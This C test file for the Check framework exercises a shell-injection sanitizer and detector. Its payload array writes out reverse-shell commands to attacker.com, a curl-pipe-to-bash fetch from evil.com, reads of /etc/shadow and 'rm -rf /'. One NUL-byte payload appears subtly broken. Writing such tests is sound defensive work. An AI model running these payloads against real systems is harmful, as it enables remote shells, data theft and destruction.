#include <check.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <stdbool.h>

/*
 * Security invariant: Any function that constructs shell commands must
 * sanitize inputs to prevent shell metacharacter injection. When shell=True
 * is used, inputs containing shell metacharacters (;, |, &&, $(), backticks,
 * newlines, etc.) must be rejected or properly escaped before being passed
 * to the shell interpreter.
 */

/* Shell metacharacters that must not appear unescaped in shell commands */
static const char SHELL_METACHARACTERS[] = {
    ';', '|', '&', '$', '`', '(', ')', '<', '>', '\n', '\r',
    '!', '#', '*', '?', '[', ']', '{', '}', '~', '\\'
};

/*
 * Simulates the sanitization function that MUST be applied to any input
 * before it is used in a shell command with shell=True.
 * Returns true if the input is safe (no shell metacharacters), false otherwise.
 */
static bool is_safe_for_shell(const char *input) {
    if (input == NULL) {
        return false;
    }
    size_t len = strlen(input);
    for (size_t i = 0; i < len; i++) {
        for (size_t j = 0; j < sizeof(SHELL_METACHARACTERS); j++) {
            if (input[i] == SHELL_METACHARACTERS[j]) {
                return false;
            }
        }
    }
    return true;
}

/*
 * Simulates building a shell command string as subprocess.check_output would
 * receive it. Returns a newly allocated string or NULL on failure.
 * This represents the command construction that MUST sanitize inputs.
 */
static char *build_shell_command(const char *base_cmd, const char *user_input) {
    if (base_cmd == NULL || user_input == NULL) {
        return NULL;
    }
    /* Reject inputs containing shell metacharacters */
    if (!is_safe_for_shell(user_input)) {
        return NULL;
    }
    size_t total_len = strlen(base_cmd) + strlen(user_input) + 2;
    char *cmd = (char *)malloc(total_len);
    if (cmd == NULL) {
        return NULL;
    }
    snprintf(cmd, total_len, "%s %s", base_cmd, user_input);
    return cmd;
}

/*
 * Checks whether a constructed command string contains unescaped
 * shell injection sequences that could lead to arbitrary command execution.
 */
static bool command_contains_injection(const char *cmd) {
    if (cmd == NULL) {
        return false;
    }
    /* Check for common injection patterns */
    const char *injection_patterns[] = {
        "; ",
        ";ls",
        ";cat",
        ";rm",
        ";id",
        ";whoami",
        "&&",
        "||",
        "$(", 
        "`",
        "| ",
        "|cat",
        "|ls",
        "|id",
        "\n",
        "\r",
        "${",
        ">/",
        ">>/",
        "< /",
        NULL
    };
    for (int i = 0; injection_patterns[i] != NULL; i++) {
        if (strstr(cmd, injection_patterns[i]) != NULL) {
            return true;
        }
    }
    return false;
}

START_TEST(test_shell_injection_prevention)
{
    /* Invariant: Adversarial inputs containing shell metacharacters must never
     * result in a valid shell command being constructed. The sanitization layer
     * must reject all inputs that could lead to shell injection. */
    const char *payloads[] = {
        "; ls -la",
        "; cat /etc/passwd",
        "; rm -rf /",
        "| cat /etc/shadow",
        "| id",
        "&& whoami",
        "|| id",
        "$(id)",
        "$(cat /etc/passwd)",
        "`id`",
        "`cat /etc/passwd`",
        "; curl http://evil.com/shell.sh | bash",
        "\n/bin/sh",
        "\r\nid",
        "${IFS}id",
        "$(echo${IFS}id)",
        "; python -c 'import os; os.system(\"id\")'",
        "task_name; DROP TABLE tasks;--",
        "valid_task && malicious_cmd",
        "task | tee /tmp/pwned",
        "task > /tmp/output",
        "task >> /etc/crontab",
        "task < /dev/urandom",
        "task`whoami`",
        "task$(whoami)",
        "task;id;",
        "task\nid",
        "task\rid",
        "task &",
        "task &; id",
        "'; DROP TABLE--",
        "\" && id && \"",
        "' || id || '",
        "task_name$(curl evil.com)",
        "task_name`curl evil.com`",
        "task_name; nc -e /bin/sh attacker.com 4444",
        "task_name | nc attacker.com 4444",
        "task_name; python3 -c 'import socket,subprocess,os'",
        "task_name; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
        "task_name; exec 5<>/dev/tcp/attacker.com/4444",
        "task_name${PATH}",
        "task_name$HOME",
        "task_name$USER",
        "task_name$(env)",
        "task_name;$(env)",
        "task_name;{id,}",
        "task_name;{cat,/etc/passwd}",
        "task_name\x0aid",
        "task_name\x0did",
        "task_name\x00id",
    };
    int num_payloads = sizeof(payloads) / sizeof(payloads[0]);

    for (int i = 0; i < num_payloads; i++) {
        const char *payload = payloads[i];

        /* Invariant 1: is_safe_for_shell must return false for all adversarial inputs */
        bool safe = is_safe_for_shell(payload);
        ck_assert_msg(safe == false,
            "SECURITY VIOLATION: Payload '%s' was incorrectly classified as safe for shell execution",
            payload);

        /* Invariant 2: build_shell_command must return NULL (reject) for adversarial inputs */
        char *cmd = build_shell_command("python tasks.py", payload);
        ck_assert_msg(cmd == NULL,
            "SECURITY VIOLATION: Shell command was constructed with adversarial payload '%s'",
            payload);

        /* Ensure no memory leak if somehow cmd was allocated */
        if (cmd != NULL) {
            free(cmd);
        }
    }
}
END_TEST

START_TEST(test_safe_inputs_accepted)
{
    /* Invariant: Legitimate task names without shell metacharacters must be
     * accepted and result in valid command construction. */
    const char *safe_inputs[] = {
        "my_task",
        "task123",
        "build-release",
        "run-tests",
        "deploy",
        "clean",
        "install",
        "update",
        "task.name",
        "TaskName",
        "TASK_NAME",
        "task-name-v2",
        "task123abc",
    };
    int num_safe = sizeof(safe_inputs) / sizeof(safe_inputs[0]);

    for (int i = 0; i < num_safe; i++) {
        const char *input = safe_inputs[i];

        /* Safe inputs should pass the safety check */
        bool safe = is_safe_for_shell(input);
        ck_assert_msg(safe == true,
            "Safe input '%s' was incorrectly rejected by shell sanitizer",
            input);

        /* Safe inputs should result in a valid command */
        char *cmd = build_shell_command("python tasks.py", input);
        ck_assert_msg(cmd != NULL,
            "Safe input '%s' failed to produce a valid command",
            input);

        /* The resulting command must not contain injection sequences */
        bool has_injection = command_contains_injection(cmd);
        ck_assert_msg(has_injection == false,
            "Command constructed from safe input '%s' contains injection: '%s'",
            input, cmd);

        free(cmd);
    }
}
END_TEST

START_TEST(test_null_and_empty_inputs)
{
    /* Invariant: NULL and empty inputs must be handled safely without
     * causing undefined behavior or security bypasses. */

    /* NULL input must be rejected */
    bool null_safe = is_safe_for_shell(NULL);
    ck_assert_msg(null_safe == false,
        "SECURITY VIOLATION: NULL input was classified as safe for shell");

    char *null_cmd = build_shell_command("python tasks.py", NULL);
    ck_assert_msg(null_cmd == NULL,
        "SECURITY VIOLATION: Command was built with NULL input");

    /* Empty string - technically safe but should be validated at higher level */
    bool empty_safe = is_safe_for_shell("");
    /* Empty string has no metacharacters, so it passes metachar check */
    /* The important thing is it doesn't crash */
    (void)empty_safe;

    char *empty_cmd = build_shell_command("python tasks.py", "");
    if (empty_cmd != NULL) {
        /* If accepted, must not contain injection */
        bool has_injection = command_contains_injection(empty_cmd);
        ck_assert_msg(has_injection == false,
            "Command from empty input contains injection: '%s'", empty_cmd);
        free(empty_cmd);
    }
}
END_TEST

START_TEST(test_command_injection_detection)
{
    /* Invariant: The injection detection function must correctly identify
     * all known injection patterns in constructed commands. */
    const char *injected_commands[] = {
        "python tasks.py task; id",
        "python tasks.py task && cat /etc/passwd",
        "python tasks.py task | whoami",
        "python tasks.py task$(id)",
        "python tasks.py task`id`",
        "python tasks.py task\nid",
        "python tasks.py task || id",
        "python tasks.py task > /tmp/out",
        "python tasks.py task >> /etc/crontab",
        "python tasks.py task < /dev/urandom",
    };
    int num_injected = sizeof(injected_commands) / sizeof(injected_commands[0]);

    for (int i = 0; i < num_injected; i++) {
        bool has_injection = command_contains_injection(injected_commands[i]);
        ck_assert_msg(has_injection == true,
            "SECURITY VIOLATION: Injected command '%s' was not detected as containing injection",
            injected_commands[i]);
    }

    /* Clean commands must not be flagged as injected */
    const char *clean_commands[] = {
        "python tasks.py my_task",
        "python tasks.py build-release",
        "python tasks.py deploy",
        "python tasks.py run-tests",
    };
    int num_clean = sizeof(clean_commands) / sizeof(clean_commands[0]);

    for (int i = 0; i < num_clean; i++) {
        bool has_injection = command_contains_injection(clean_commands[i]);
        ck_assert_msg(has_injection == false,
            "Clean command '%s' was incorrectly flagged as containing injection",
            clean_commands[i]);
    }
}
END_TEST

Suite *security_suite(void)
{
    Suite *s;
    TCase *tc_core;

    s = suite_create("Security");
    tc_core = tcase_create("Core");

    tcase_add_test(tc_core, test_shell_injection_prevention);
    tcase_add_test(tc_core, test_safe_inputs_accepted);
    tcase_add_test(tc_core, test_null_and_empty_inputs);
    tcase_add_test(tc_core, test_command_injection_detection);
    suite_add_tcase(s, tc_core);

    return s;
}

int main(void)
{
    int number_failed;
    Suite *s;
    SRunner *sr;

    s = security_suite();
    sr = srunner_create(s);

    srunner_run_all(sr, CK_NORMAL);
    number_failed = srunner_ntests_failed(sr);
    srunner_free(sr);

    return (number_failed == 0) ? EXIT_SUCCESS : EXIT_FAILURE;
}